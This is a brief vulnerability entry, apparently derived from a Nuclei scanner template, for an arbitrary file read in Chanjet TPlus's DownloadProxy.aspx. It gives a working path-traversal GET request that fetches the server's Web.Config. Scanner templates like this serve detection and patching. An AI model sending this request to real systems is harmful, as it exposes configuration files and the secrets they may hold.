# Vulnerability: Chanjet TPlus DownloadProxy.aspx - Arbitrary File Read
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`chanjet-tplus-file-read.yaml`)

## Description
Chanjet TPlus DownloadProxy.aspx file has an arbitrary file reading vulnerability. An attacker can obtain sensitive files on the server through the vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config
```

